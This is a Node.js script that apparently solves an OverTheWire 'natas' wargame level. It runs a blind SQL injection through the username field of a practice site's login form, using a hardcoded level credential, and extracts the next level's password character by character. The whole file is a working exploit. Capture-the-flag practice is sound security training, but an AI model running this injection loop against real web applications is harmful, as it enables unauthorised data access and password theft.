const http = require('http');
const querystring = require('querystring');

const submit = text =>
  new Promise((resolve, reject) => {
    const request = http.request(
      {
        auth: 'natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        hostname: 'natas15.natas.labs.overthewire.org',
        method: 'POST',
        path: '/index.php',
        port: 80,
      },
      res => {
        let body = '';
        res.on('data', data => (body = body + data));
        // res.on('end', () => {
        //   console.log(body);
        // });
        res.on('end', () => resolve(!body.match(/doesn't/)));
      },
    );

    const username = `natas16" AND password LIKE BINARY '${text}' -- `;

    request.write(querystring.stringify({username}));

    request.end();
  });

const containsText = text => submit(`%${text}%`);
const startsWithText = text => submit(`${text}%`);

let characters = [...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'];

const tryCharacter = (promise, character) =>
  promise.then(text =>
    startsWithText(text + character).then(isContained => {
      console.log(`trying ${text + character}`);
      if (isContained) throw text + character;
      return text;
    }),
  );

const findNextCharacter = text =>
  new Promise((resolve, reject) =>
    characters
      .reduce(tryCharacter, Promise.resolve(text))
      .then(reject)
      .catch(resolve),
  );

const findAllCharacters = text =>
  findNextCharacter(text).then(findAllCharacters);

Promise.all(characters.map(containsText))
  .then(promises => {
    characters = characters.filter((c, i) => promises[i]);
  })
  .then(() => {
    console.log(`Reduced characters: ${characters}`);

    findAllCharacters('').catch(answer => console.log(answer));
  });
